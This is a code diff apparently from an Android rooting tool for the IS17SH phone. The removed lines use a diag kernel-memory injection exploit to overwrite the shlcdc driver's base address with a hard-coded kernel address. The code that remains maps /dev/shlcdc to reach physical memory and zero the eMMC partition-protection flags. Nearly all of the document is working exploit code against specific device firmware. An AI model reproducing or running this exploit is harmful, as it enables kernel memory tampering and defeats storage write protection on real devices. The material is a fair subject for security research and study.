@@ -25,93 +25,8 @@
 #include <errno.h>
 #include <sys/ioctl.h>
 #include <stdbool.h>
-#include <sys/system_properties.h>
 
-#include "libdiagexploit/diag.h"
-
-#define PAGE_SHIFT 12
-#define PAGE_OFFSET 0xC0000000
-#define PHYS_OFFSET 0x40000000
-
-typedef struct _supported_device {
-  const char *device;
-  const char *build_id;
-  unsigned long int shlcdc_base_addr;
-} supported_device;
-
-supported_device supported_devices[] = {
-  { "IS17SH", "01.00.03", 0xc0fe848c }
-};
-
-static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
-
-static unsigned long int
-get_shlcdc_base_addr(void)
-{
-  int i;
-  char device[PROP_VALUE_MAX];
-  char build_id[PROP_VALUE_MAX];
-
-  __system_property_get("ro.product.model", device);
-  __system_property_get("ro.build.display.id", build_id);
-
-  for (i = 0; i < n_supported_devices; i++) {
-    if (!strcmp(device, supported_devices[i].device) &&
-        !strcmp(build_id, supported_devices[i].build_id)) {
-      return supported_devices[i].shlcdc_base_addr;
-    }
-  }
-  printf("%s (%s) is not supported.\n", device, build_id);
-
-  return 0;
-}
-
-static bool
-inject_address(unsigned int address)
-{
-  struct diag_values injection_data[2];
-  unsigned long int target_address;
-
-  target_address = get_shlcdc_base_addr();
-  if (!target_address)
-    return false;
-
-  injection_data[0].address = target_address;
-  injection_data[0].value = (address & 0xffff);
-
-  injection_data[1].address = target_address + 2;
-  injection_data[1].value = (address & 0xffff0000) >> 16;
-
-  return diag_inject(injection_data, 2) == 0;
-}
-
-static bool
-set_mmap_address(unsigned long address)
-{
-  return inject_address(address);
-}
-
-static bool
-fake_shlcdc_base_addr(void)
-{
-  if (!set_mmap_address((PHYS_OFFSET << PAGE_SHIFT))) {
-    printf("Failed to fake shlcdc_base_addr due to %s\n",
-           strerror(errno));
-    return false;
-  }
-  return true;
-}
-
-static bool
-restore_shlcdc_base_addr(void)
-{
-  if (!set_mmap_address(0x8B000000)) {
-    printf("Failed to restore shlcdc_base_addr due to %s\n",
-           strerror(errno));
-    return false;
-  }
-  return true;
-}
+#include "shlcdc_mmap.h"
 
 typedef enum {
   MIBIB_PARTITION    = 2,
@@ -200,23 +115,21 @@ unlock_protection(int32_t mmc_protect_part_index)
   int length = page_size * page_size;
   int index;
 
-  fd = open("/dev/shlcdc", O_RDWR);
+  fd = shlcdc_mmap_device_open();
   if (fd < 0) {
-    printf("Failed to open /dev/shlcdc due to %s\n", strerror(errno));
     return false;
   }
 
-  address = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  address = shlcdc_mmap(NULL, length, fd);
   if (address == MAP_FAILED) {
     close(fd);
-    printf("Failed to mmap due to %s\n", strerror(errno));
     return false;
   }
 
   mmc_protect_part_address = find_mmc_protect_part(address, length);
   if (!mmc_protect_part_address) {
     printf("Couldn't find mmc_part_protect address\n");
-    munmap(address, length);
+    shlcdc_munmap(address, length);
     close(fd);
     return false;
   }
@@ -231,7 +144,7 @@ unlock_protection(int32_t mmc_protect_part_index)
     mmc_protect_part[index].protect = 0;
   }
 
-  munmap(address, length);
+  shlcdc_munmap(address, length);
   close(fd);
 
   return true;
@@ -316,12 +229,7 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  if (!fake_shlcdc_base_addr()) {
-    exit(EXIT_FAILURE);
-  }
-
   ret = unlock_protection(mmc_protect_part_index);
-  restore_shlcdc_base_addr();
 
   if (!ret) {
     exit(EXIT_FAILURE);
